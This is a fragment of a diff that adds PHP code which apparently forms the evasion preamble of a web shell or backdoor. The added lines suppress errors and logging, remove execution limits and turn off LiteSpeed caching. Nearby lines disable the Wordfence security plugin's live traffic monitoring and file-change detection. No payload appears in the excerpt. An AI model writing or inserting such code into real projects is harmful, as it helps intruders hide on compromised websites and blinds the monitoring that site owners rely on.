@@ -10,6 +10,21 @@ if (!isset($_SESSION['auth'])) {
         exit;
     }
 }
+
+@clearstatcache();
+@set_time_limit(0);
+@ini_set('display_errors', 0);
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+
+if (function_exists('litespeed_request_headers')) {
+    $a = litespeed_request_headers();
+    if (isset($a['X-LSCACHE'])) {
+        header('X-LSCACHE: off');
+    }
+}
 if (defined('WORDFENCE_VERSION')) {
     define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
     define('WORDFENCE_DISABLE_FILE_MODS', true);
